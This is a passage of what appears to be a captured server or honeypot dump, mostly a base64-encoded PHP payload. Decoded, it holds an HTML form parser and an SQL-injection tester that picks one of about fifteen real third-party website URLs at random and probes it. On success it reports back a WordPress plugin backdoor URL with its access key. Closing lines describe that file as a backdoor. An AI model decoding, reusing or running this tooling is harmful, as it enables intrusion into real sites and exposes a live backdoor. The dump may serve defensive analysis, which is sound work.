nX21hdGNoX2FsbCgiLzxpbnB1dC4qdHlwZT1bXCInXT9idXR0b25bXCInXT8uKj4vaVUiLCAkZ3RpbnB1dCwgJGJ1dHRvbnMpICkgewoJCQkJCWZvcmVhY2ggKCAkYnV0dG9uc1swXSBhcyAkYnV0dG9uICkgewoJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydidXR0b25zJ11bJHRoaXMtPmJ1dHRvbl9jb3VudGVyXSA9IGFycmF5KAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSd0eXBlJwk9PiAnYnV0dG9uJywKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQknbmFtZScJPT4gJHRoaXMtPl9nZXROYW1lKCRidXR0b24pLAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSd2YWx1ZScJPT4gJHRoaXMtPl9nZXRWYWx1ZSgkYnV0dG9uKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSk7CgkJCQkJCSR0aGlzLT5idXR0b25fY291bnRlcisrOwoJCQkJCX0KCQkJCX0KCQkJCQoJCQkJLyoKCQkJCSAqIDxpbnB1dCB0eXBlPXJlc2V0IGVudHJpZXMKCQkJCSAqLwoJCQkJaWYgKCBwcmVnX21hdGNoX2FsbCgiLzxpbnB1dC4qdHlwZT1bXCInXT9yZXNldFtcIiddPy4qPi9pVSIsICRndGlucHV0LCAkcmVzZXRzKSApIHsKCQkJCQlmb3JlYWNoICggJHJlc2V0c1swXSBhcyAkcmVzZXQgKSB7CgkJCQkJCSR0aGlzLT5fcmV0dXJuWyR0aGlzLT5fY291bnRlcl1bJ2J1dHRvbnMnXVskdGhpcy0+YnV0dG9uX2NvdW50ZXJdID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3R5cGUnCT0+ICdyZXNldCcsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ25hbWUnCT0+ICR0aGlzLT5fZ2V0TmFtZSgkcmVzZXQpLAoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSd2YWx1ZScJPT4gJHRoaXMtPl9nZXRWYWx1ZSgkcmVzZXQpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJKTsKCQkJCQkJJHRoaXMtPmJ1dHRvbl9jb3VudGVyKys7CgkJCQkJfQoJCQkJfQoJCQkJCgkJCQkvKgoJCQkJICogPGlucHV0IHR5cGU9aW1hZ2UgZW50cmllcwoJCQkJICovCgkJCQlpZiAoIHByZWdfbWF0Y2hfYWxsKCIvPGlucHV0Lip0eXBlPVtcIiddP2ltYWdlW1wiJ10/Lio+L2lVIiwgJGd0aW5wdXQsICRpbWFnZXMpICkgewoJCQkJCWZvcmVhY2ggKCAkaW1hZ2VzWzBdIGFzICRpbWFnZSApIHsKCQkJCQkJJHRoaXMtPl9yZXR1cm5bJHRoaXMtPl9jb3VudGVyXVsnYnV0dG9ucyddWyR0aGlzLT5idXR0b25fY291bnRlcl0gPSBhcnJheSgKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndHlwZScJPT4gJ3Jlc2V0JywKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQknbmFtZScJPT4gJHRoaXMtPl9nZXROYW1lKCRpbWFnZSksCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJJ3ZhbHVlJwk9PiAkdGhpcy0+X2dldFZhbHVlKCRpbWFnZSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkpOwoJCQkJCQkkdGhpcy0+YnV0dG9uX2NvdW50ZXIrKzsKCQkJCQl9CgkJCQl9CgoKCQkJCgoJCgkJIAl9CgkJfQoKCQkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8g0LrQvtC90LXRhiDQtNC+0LHQsNCy0LvQtdC90L3QvtCz0L4g0YbQuNC60LvQsAoKCgoKCgoJCQkJLyoKCQkJCSAqIDxpbnB1dCB0eXBlPXNlbGVjdCBlbnRyaWVzCgkJCQkgKiBIZXJlIEkgaGF2ZSB0byBnbyBvbiBzdGVwIGFyb3VuZCB0byBncmVwIGF0IGZpcnN0IGFsbCBzZWxlY3QgbmFtZXMgYW5kIHRoZW4KCQkJCSAqIHRoZSBjb250ZW50LiBTZWVtcyBub3QgdG8gd29yayBpbiBhbiBvdGhlciB3YXkKCQkJCSAqLwoJCQkJaWYgKCBwcmVnX21hdGNoX2FsbCgiLzxzZWxlY3QuKj4uKzxcL3NlbGVjdD4vaXNVIiwgJGZvcm0sICRzZWxlY3RzKSApIHsKCQkJCQlmb3JlYWNoICggJHNlbGVjdHNbMF0gYXMgJHNlbGVjdCApIHsKCQkJCQkJaWYgKCBwcmVnX21hdGNoX2FsbCgiLzxvcHRpb24uKj4uKzxcL29wdGlvbj4vaXNVIiwgJHNlbGVjdCwgJGFsbF9vcHRpb25zKSApIHsKCQkJCQkJCWZvcmVhY2ggKCAkYWxsX29wdGlvbnNbMF0gYXMgJG9wdGlvbiApIHsKCQkJCQkJCQlpZiAoIHByZWdfbWF0Y2goIi9zZWxlY3RlZC9pIiwgJG9wdGlvbikgKSB7CgkJCQkJCQkJCWlmICggcHJlZ19tYXRjaCgiL3ZhbHVlPVtcIiddKC4qKVtcIiddXHMvaVUiLCAkb3B0aW9uLCAkb3B0aW9uX3ZhbHVlKSApIHsKCQkJCQkJCQkJCSRvcHRpb25fdmFsdWUgPSAkb3B0aW9uX3ZhbHVlWzFdOwoJCQkJCQkJCQkJJGZvdW5kX3NlbGVjdGVkID0gMTsKCQkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJCXByZWdfbWF0Y2goIi88b3B0aW9uLio+KC4qKTxcL29wdGlvbj4vaXNVIiwgJG9wdGlvbiwgJG9wdGlvbl92YWx1ZSk7CgkJCQkJCQkJCQkkb3B0aW9uX3ZhbHVlID0gJG9wdGlvbl92YWx1ZVsxXTsKCQkJCQkJCQkJCSRmb3VuZF9zZWxlY3RlZCA9IDE7CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQlpZiAoICFpc3NldCgkZm91bmRfc2VsZWN0ZWQpICkgewoJCQkJCQkJCWlmICggcHJlZ19tYXRjaCgiL3ZhbHVlPVtcIiddKC4qKVtcIiddL2lVIiwgJGFsbF9vcHRpb25zWzBdWzBdLCAkb3B0aW9uX3ZhbHVlKSApIHsKCQkJCQkJCQkJJG9wdGlvbl92YWx1ZSA9ICRvcHRpb25fdmFsdWVbMV07CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJcHJlZ19tYXRjaCgiLzxvcHRpb24+KC4qKTxcL29wdGlvbj4vaVUiLCAkYWxsX29wdGlvbnNbMF1bMF0sICRvcHRpb25fdmFsdWUpOwoJCQkJCQkJCQkkb3B0aW9uX3ZhbHVlID0gJG9wdGlvbl92YWx1ZVsxXTsKCQkJCQkJCQl9CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCXVuc2V0KCRmb3VuZF9zZWxlY3RlZCk7CgkJCQkJCQl9CgkJCQkJCQkkdGhpcy0+X3JldHVyblskdGhpcy0+X2NvdW50ZXJdWydmb3JtX2VsZW1ldHMnXVskdGhpcy0+X2dldE5hbWUoJHNlbGVjdCldID0gYXJyYXkoCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndHlwZScJPT4gJ3NlbGVjdCcsCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkndmFsdWUnCT0+IHRyaW0oJG9wdGlvbl92YWx1ZSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgoJCQkJLyoKCQkJCSAqIFVwZGF0ZSB0aGUgZm9ybSBjb3VudGVyIGlmIHdlIGhhdmUgbW9yZSB0aGVuIDEgZm9ybSBpbiB0aGUgSFRNTCB0YWJsZQoJCQkJICovCgkJCQkkdGhpcy0+X2NvdW50ZXIrKzsKCQkJfQoJCX0KCQlyZXR1cm4gJHRoaXMtPl9yZXR1cm47Cgl9CgkKCS8qKgoJICogR2V0IE5hbWUgZnJvbSBzdHJpbmcKCSAqIEBhY2Nlc3MgcHJpdmF0ZQoJICogQHBhcmFtIHN0cmluZwoJICogQHJldHVybiBzdHJpbmcKCSAqLwoJZnVuY3Rpb24gX2dldE5hbWUoICRzdHJpbmcgKSB7CgkJaWYgKCBwcmVnX21hdGNoKCIvbmFtZT1bXCInXT8oW1x3XHNcXVxbXSopW1wiJ10/W1xzPl0vaSIsICRzdHJpbmcsICRtYXRjaCkgKSB7CgkJCSR2YWxfbWF0Y2ggPSBwcmVnX3JlcGxhY2UoIi9cIicvIiwgIiIsIHRyaW0oJG1hdGNoWzFdKSk7CgkJCQoJCQl1bnNldCgkc3RyaW5nKTsKCQkJcmV0dXJuICR2YWxfbWF0Y2g7CgkJfQoJfQoJCgkvKioKCSAqIEdldCBWYWx1ZSBmcm9tIHN0cmluZwoJICogQGFjY2VzcyBwcml2YXRlCgkgKiBAcGFyYW0gc3RyaW5nCgkgKiBAcmV0dXJuIHN0cmluZwoJICovCglmdW5jdGlvbiBfZ2V0VmFsdWUoICRzdHJpbmcgKSB7CgkJaWYgKCBwcmVnX21hdGNoKCIvdmFsdWU9KFwiKFteXCJdKilcInwnKFteJ10qKSd8W14+XHNdKikoW14+XSopL2lzIiwgJHN0cmluZywgJG1hdGNoKSApIHsKCQkJJHZhbF9tYXRjaCA9IHRyaW0oJG1hdGNoWzFdKTsKCQkJCgkJCWlmICggc3Ryc3RyKCR2YWxfbWF0Y2gsICciJykgKSB7CgkJCQkkdmFsX21hdGNoID0gc3RyX3JlcGxhY2UoJyInLCAnJywgJHZhbF9tYXRjaCk7CgkJCX0KCQkJCgkJCXVuc2V0KCRzdHJpbmcpOwoJCQlyZXR1cm4gJHZhbF9tYXRjaDsKCQl9Cgl9Cgp9CgoKCgppZ25vcmVfdXNlcl9hYm9ydCgxKTsgCiRteXNxbCA9IG5ldyBJbmplY3RvckNvbXBvbmVudCgpOwokdVtdID0gJ3d3dy5iYWNodmVyYmFuZC5kZS9pbmRleC5waHA/cGNpZD0xJnBkaWQ9MTYnOwokdVtdID0gJ21vbGVjdWxhcmNsb25pbmcuY29tL2luZGV4LnBocD9wcnQ9MTk5JzsKJHVbXSA9ICd3d3cuZGpwYXRyaWNrc3RlcmsubmwvaW5kZXgucGhwP3BhZ2U9aG9tZSZzaG93PTIzJzsKJHVbXSA9ICd3d3cuZWxvdGV0by5odS9wb3J0YWwvaW5kZXgyLnBocD9jYXRlZ29yeT01MCZzaG93Y29udGVudD0yJzsKJHVbXSA9ICd3d3cudGhldHlyZXdvcmxkLmluL3Rlc3RpbW9uaWFsLWRldGFpbHMucGhwP2lkPTEwMDAnOwokdVtdID0gJ3d3dy5ncm9lcGVuZ3JvbmluZ2VuLm5sL29ubGluZS9kZXRhaWxzLnBocD9pZD02JzsKJHVbXSA9ICdhY2Nlc3NhdXRvLmNvLnphL2RldGFpbHMucGhwP3N0b2NrbnI9YXVkaWFsbHJvYWQnOwokdVtdID0gJ3d3dy5nbnh0cy5jb20vam9icy1kZXRhaWxzLnBocD9qaT0yMDgnOwokdVtdID0gJ3d3dy5wcmVnbmFuY3ktYmFieS1jYXJlLmNvbS9saXN0X3JlbGF0ZWRfY29udGVudHMucGhwP3E9MTY3OSZyZWw9Y2F0ZWdvcnknOwokdVtdID0gJ3d3dy5vbmVjbGlja2hvbWV2aWRlb3MuY29tL21lbWJlcnMvcGVyZi12aWRlb3MucGhwP2lkPTExJzsKJHVbXSA9ICdwaWZleHBsb3Npb24uY29tL3NwbGFzaHBhZ2UyLnBocD9yZWY9c3VucmlzZSc7CiR1W10gPSAnd3d3Lm5ld3JlbGVhc2V0b2RheS5jb20vYXJ0aXN0ZGV0YWlsLnBocD9hcnRpc3RfaWQ9MTA5OCc7CiR1W10gPSAnd3d3LnNlbGVjdHNtYXJ0LmNvbS9wbHVzL3NlbGVjdC5waHA/dXJsPWNvbmZsaWN0YW5pbWFsJzsKJHVbXSA9ICd0b29scy5iYXJkaWF1dG8ucm8vZGV0YWlscy5waHA/a29kPVRMQ0IxMDE1JzsKJHVbXSA9ICduZXdzLnZlZ2FuLmNvbS9wYWdlcy9hcnRpY2xlLnBocD9pZD0xMzk3JzsKCgoKJHJycj0gbXRfcmFuZCgwLHNpemVvZigkdSktMSk7CgoKCgovLyR1ID0gJ2hkbGVlY2hlci5jb20vP3M9ZnMnOwovLyR0ZXN0ID0gJG15c3FsLT5pbmpfdGVzdCgkdSk7CiRteXNxbC0+bG9nX2VuYWJsZT1mYWxzZTsKJG15c3FsLT5kZWJ1ZyA9ZmFsc2U7CgoKCiR0ZXN0ID0gJG15c3FsLT5pbmpfdGVzdCgkdVskcnJyXSk7CmlmKCR0ZXN0ICE9ZmFsc2UpewoJZWNobyAnfHxzdHJhdGlnZXJ5LmNvbS93cC1jb250ZW50L3BsdWdpbnMvd3BfbW9kdWxlL3dwX3RhZ3MucGhwP2tleT1zZGZhZHNnaDQ1MTNzZEdHNDM1MzQxRkRHV1dERkdERkhERkdEU0ZHREZTR0RGR3x8IG9sb2xvJzsKCQp9CmRpZTsKCi8vL9C70L7Qs9C40YDQvtCy0LDQvdC40LUKLy9wcmludF9yKCRfU0VSVkVSKTsKLy9wcmludF9yKCRteXNxbCk7
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wp-content/plugins/wp_module
'key' and 'fack' parameters, acting as wp_tags.php backdoor.
